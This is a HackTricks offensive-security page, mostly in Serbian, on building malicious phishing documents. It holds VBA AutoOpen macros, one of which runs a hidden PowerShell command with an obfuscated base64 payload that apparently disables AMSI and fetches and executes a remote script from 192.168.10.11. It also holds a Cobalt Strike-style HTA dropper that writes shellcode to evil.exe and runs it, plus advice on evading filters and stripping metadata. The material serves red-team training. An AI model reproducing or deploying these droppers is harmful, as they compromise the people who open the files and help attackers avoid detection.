# Phishing Files & Documents

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Office Documents

Microsoft Word vrši validaciju podataka datoteke pre otvaranja datoteke. Validacija podataka se vrši u obliku identifikacije strukture podataka, prema OfficeOpenXML standardu. Ako dođe do bilo kakve greške tokom identifikacije strukture podataka, datoteka koja se analizira neće biti otvorena.

Obično, Word datoteke koje sadrže makroe koriste `.docm` ekstenziju. Međutim, moguće je preimenovati datoteku promenom ekstenzije datoteke i i dalje zadržati sposobnosti izvršavanja makroa.\
Na primer, RTF datoteka ne podržava makroe, po dizajnu, ali DOCM datoteka preimenovana u RTF biće obrađena od strane Microsoft Word-a i biće sposobna za izvršavanje makroa.\
Iste unutrašnje funkcije i mehanizmi se primenjuju na sve softvere iz Microsoft Office Suite (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će biti izvršene od strane nekih Office programa:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX datoteke koje se pozivaju na udaljeni šablon (Datoteka – Opcije – Dodaci – Upravljanje: Šabloni – Idi) koji uključuje makroe mogu takođe "izvršavati" makroe.

### Učitavanje spoljne slike

Idite na: _Umetni --> Brzi delovi --> Polje_\
&#xNAN;_**Kategorije**: Linkovi i reference, **Nazivi polja**: includePicture, i **Naziv datoteke ili URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (155).png>)

### Makro zadnja vrata

Moguće je koristiti makroe za pokretanje proizvoljnog koda iz dokumenta.

#### Autoload funkcije

Što su češće, to je verovatnije da će ih AV otkriti.

* AutoOpen()
* Document\_Open()

#### Primeri koda makroa
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ručno uklonite metapodatke

Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite **Inspect** i zatim **Remove All** pored **Document Properties and Personal Information**.

#### Doc ekstenzija

Kada završite, odaberite **Save as type** padajući meni, promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
Uradite to jer **ne možete sačuvati makroe unutar `.docx`** i postoji **stigma** **oko** makro-omogućene **`.docm`** ekstenzije (npr. ikona sličice ima ogromnu `!` i neki web/email prolazi ih potpuno blokiraju). Stoga, ova **legacy `.doc` ekstenzija je najbolje rešenje**.

#### Malicious Macros Generators

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA datoteke

HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao "potpuno poverljiva" aplikacija, bez ograničenja sigurnosnog modela pretraživača.

HTA se izvršava koristeći **`mshta.exe`**, koji je obično **instaliran** zajedno sa **Internet Explorer**, čineći **`mshta` zavisnim od IE**. Dakle, ako je deinstaliran, HTA neće moći da se izvrši.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Prisiljavanje NTLM autentifikacije

Postoji nekoliko načina da se **prisilite NTLM autentifikaciju "na daljinu"**, na primer, možete dodati **nevidljive slike** u e-mailove ili HTML koje korisnik otvara (čak i HTTP MitM?). Ili pošaljite žrtvi **adresu fajlova** koji će **pokrenuti** **autentifikaciju** samo za **otvaranje foldera.**

**Proverite ove ideje i još više na sledećim stranicama:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM Preusmeravanje

Ne zaboravite da ne možete samo ukrasti hash ili autentifikaciju, već i **izvršiti NTLM preusmeravanje napade**:

* [**NTLM Preusmeravanje napadi**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM preusmeravanje na sertifikate)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
